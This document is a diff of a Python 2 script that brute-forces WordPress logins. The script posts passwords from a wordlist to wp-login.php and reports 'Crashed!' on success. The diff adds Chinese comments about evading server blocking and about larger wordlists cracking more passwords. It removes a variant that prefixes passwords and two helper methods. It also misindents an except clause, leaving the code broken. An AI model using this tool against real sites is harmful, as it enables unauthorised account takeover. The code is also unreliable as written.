@@ -5,6 +5,7 @@ import urllib, urllib2, time, re, cookielib,sys
 
 class wordpress():
     def __init__(self, host, username):
+		#初始化定义 header ，避免被服务器屏蔽
         self.username = username
         self.http="http://"+host
         self.url =  self.http + "/wp-login.php"
@@ -21,6 +22,7 @@ class wordpress():
     def crash(self, filename):
         try:
             pwd = open(filename, 'r')
+			#读取密码文件，密码文件中密码越多破解的概率越大
             while 1 :
                 i=pwd.readline()
                 if not i :
@@ -29,10 +31,12 @@ class wordpress():
                 data = urllib.urlencode(
                     {"log": self.username, "pwd": i.strip(), "testcookie": "1", "redirect_to": self.redirect})
                 Req = urllib2.Request(url=self.url, data=data, headers=self.headers)
+				#构造好数据包之后提交给wordpress网站后台
                 Resp = urllib2.urlopen(Req)
                 result = Resp.read()
                 # print result
                 login = re.search(r'login_error', result)
+				#判断返回来的字符串，如果有login error说明失败了。
                 if login:
                     pass
                 else:
@@ -46,49 +50,10 @@ class wordpress():
 
             pwd.close()
 
-            pwd = open(filename, 'r')
-            for i in pwd:
-                data = urllib.urlencode(
-                    {"log": self.username, "pwd": "plough"+i.strip(), "testcookie": "1", "redirect_to": self.redirect})
-                Req = urllib2.Request(url=self.url, data=data, headers=self.headers)
-                Resp = urllib2.urlopen(Req)
-                result = Resp.read()
-                # print result
-                login = re.search(r'login_error', result)
-                if login:
-                    pass
-                else:
-                    print "Crashed! password is %s %s" % (self.username,i.strip())
-                    pwd.close()
-                    break
-
-            pwd.close()
-
-
-        except Exception, e:
+			except Exception, e:
             print "error"
             print e
             print "Error in reading password"
-
-    def crash_v(self):
-        #str_name = u"登陆"
-        #print str_name
-        data = urllib.urlencode(
-            {"log": self.username, "pwd": "test", "testcookie": "1", "redirect_to": self.redirect})
-        req = urllib2.Request(url=self.url, data=data, headers=self.headers)
-        result = self.opener.open(req)
-        back_info = result.read()
-        print back_info
-        login = re.search(r'login_error', back_info)
-        if login:
-            print "Failed"
-        else:
-            print "Crashed! password "
-
-
-    def check(self):
-        print self.url
-        print self.username
 
 
 if __name__ == "__main__":
